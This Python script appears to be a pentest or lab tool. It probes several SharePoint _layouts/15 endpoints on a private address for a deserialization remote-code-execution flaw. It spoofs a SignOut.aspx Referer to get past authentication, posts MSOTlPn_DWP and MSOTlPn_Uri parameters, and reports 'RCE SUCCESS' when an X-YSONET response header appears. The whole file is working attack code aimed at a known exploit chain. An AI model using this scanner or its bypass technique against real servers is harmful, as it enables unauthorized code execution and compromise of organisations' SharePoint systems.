#!/usr/bin/env python3
"""
Test bypassed endpoints with deserialization payload
Purpose: Find if any accept MSOTlPn_DWP parameter and trigger RCE
"""
import requests

requests.packages.urllib3.disable_warnings()

# Read the original payload
with open('additional_resources/exploits/exploit.py', 'r') as f:
    exploit_content = f.read()

# Extract the body template (simplified - just test with minimal payload)
test_payload = "MSOTlPn_DWP=test&MSOTlPn_Uri=http://10.10.10.166/test"

def test_endpoint_with_payload(target, endpoint, description):
    """Test endpoint with POST payload"""
    url = f"{target}{endpoint}?DisplayMode=Edit&foo={endpoint}"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows; U; Windows CE; Mobile; like Android; ko-kr) AppleWebKit/533.3",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
        "Referer": "/_layouts/SignOut.aspx",
    }
    
    print(f"\n[*] Testing: {description}")
    print(f"    Endpoint: {endpoint}")
    
    try:
        response = requests.post(url, headers=headers, data=test_payload, verify=False, timeout=30)
        print(f"    Status: {response.status_code}")
        
        # Check for RCE indicator
        if "X-YSONET" in response.headers:
            print(f"    [!!!] RCE SUCCESS - X-YSONET header found!")
            return True
        
        # Check if response indicates payload was processed
        if "MSOTlPn" in response.text[:1000]:
            print(f"    [+] Response mentions MSOTlPn - might process parameter")
        
        # Check for error messages that indicate deserialization attempt
        if "deserialization" in response.text.lower() or "serialize" in response.text.lower():
            print(f"    [+] Response mentions serialization")
        
        print(f"    Response length: {len(response.text)}")
        
    except Exception as e:
        print(f"    Error: {str(e)}")
    
    return False

if __name__ == "__main__":
    target = "http://10.10.10.166"
    
    endpoints = [
        ("/_layouts/15/WpAdder.aspx", "WpAdder"),
        ("/_layouts/15/WebPartGallery.aspx", "WebPartGallery"),
        ("/_layouts/15/WebPartAdder.aspx", "WebPartAdder"),
        ("/_layouts/15/EditPane.aspx", "EditPane"),
        ("/_layouts/15/ToolPaneView.aspx", "ToolPaneView"),
        ("/_layouts/15/WebPartPage.aspx", "WebPartPage"),
    ]
    
    for endpoint, desc in endpoints:
        test_endpoint_with_payload(target, endpoint, desc)

